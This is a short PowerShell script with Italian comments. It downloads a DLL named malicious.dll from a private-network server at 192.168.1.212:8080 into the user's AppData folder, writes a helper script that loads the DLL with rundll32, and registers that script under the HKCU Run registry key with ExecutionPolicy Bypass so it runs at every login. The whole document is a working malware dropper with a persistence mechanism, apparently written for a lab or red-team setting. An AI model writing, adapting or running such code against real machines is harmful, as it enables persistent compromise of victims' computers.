# Percorso in cui la DLL verrà posizionata (utilizzando la cartella AppData)
$targetPath = "$env:APPDATA\malicious.dll"

# URL del server per il download della DLL
$downloadUrl = "http://192.168.1.212:8080/malicious.dll"

# Scarica la DLL
Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath

# Controllo se il download è andato a buon fine
if (Test-Path -Path $targetPath) {
    Write-Output "DLL scaricata in $targetPath"

    # Percorso dove sarà salvato lo script di persistenza
    $loadScriptPath = "$env:APPDATA\LoadDLL.ps1"
    
    # Crea il contenuto dello script PowerShell per caricare la DLL
    $loadScriptContent = @"
$targetPath = "$env:APPDATA\malicious.dll"
rundll32.exe "$targetPath", EntryPoint
"@

    # Salva lo script di persistenza
    $loadScriptContent | Out-File -FilePath $loadScriptPath -Encoding UTF8

    Write-Output "Secondo script PowerShell creato in $loadScriptPath"

    # Aggiungi una voce di avvio nel registro per eseguire lo script PowerShell al login
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $valueName = "LoadCustomDLL"
    $valueData = "powershell.exe -ExecutionPolicy Bypass -File `"$loadScriptPath`""

    New-ItemProperty -Path $registryPath -Name $valueName -Value $valueData -PropertyType String

    Write-Output "Voce di avvio aggiunta al registro per eseguire la DLL"

} else {
    Write-Output "Errore nel download della DLL"
}
